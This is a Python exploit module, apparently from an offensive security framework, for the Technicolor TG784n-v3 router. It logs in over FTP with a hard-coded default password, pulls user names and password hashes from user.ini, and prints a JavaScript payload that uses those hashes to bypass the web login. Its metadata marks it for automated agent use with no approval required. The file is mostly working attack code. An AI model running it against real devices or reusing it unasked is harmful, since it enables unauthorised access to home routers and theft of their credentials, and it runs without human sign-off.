#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Technicolor TG784n-v3 Auth Bypass"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'Technicolor TG784n-v3 Auth Bypass',
        'description': 'Module exploits Technicolor TG784n-v3 authentication bypass vulnerability.',
        'author': ['Jose Moreira', '0BuRner', 'Marcin Bury'],
        
        'platform': Platform.LINUX,
        'references': ['http://modem-help.forum-phpbb.co.uk/t1-fixing-username-password-problems', 'http://modem-help.forum-phpbb.co.uk/t2-howto-root-tg784'],
        'tags': ['iot', 'router', 'unauth', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(21, "Target FTP port")
    username = OptString("upgrade", "Default FTP username")
    password = OptString("Th0ms0n!", "Default FTP password for \"upgrade\" user")

    def run(self):
        creds = self.get_credentials()
        if creds:
            print_success("Found encrypted credentials:")
            print_table(("Name", "Password", "Role", "Hash2", "Crypt"), *creds)

            print_status("Use javascript console (through developer tools) to bypass authentication:")
            payload = ('var user = "{}"\n'
                       'var hash2 = "{}";\n'
                       'var HA2 = MD5("GET" + ":" + uri);\n'
                       'document.getElementById("user").value = user;\n'
                       'document.getElementById("hidepw").value = MD5(hash2 + ":" + nonce +":" + "00000001" + ":" + "xyz" + ":" + qop + ":" + HA2);\n'
                       'document.authform.submit();\n')

            for user in creds:
                print_success("User: {} Role: {}".format(user[0], user[2]))
                print_info(payload.format(user[0], user[3]))

        else:
            print_error("Exploit failed - target seems to be not vulnerable")
    def check(self):
        if self.get_credentials():
            return True

        return False
    def get_credentials(self):
        print_status("Trying FTP authentication with Username: {} and Password: {}".format(self.username,
                                                                                           self.password))

        ftp_client = self.ftp_create()
        if ftp_client.login(self.username, self.password):
            print_success("Authentication successful")
            content = self.ftp_get_content(ftp_client, "user.ini")
            creds = re.findall(r"add name=(.*) password=(.*) role=(.*) hash2=(.*) crypt=(.*)\r\n", str(content, "utf-8"))
            return creds
        else:
            print_error("Exploit failed - authentication failed")

        return None
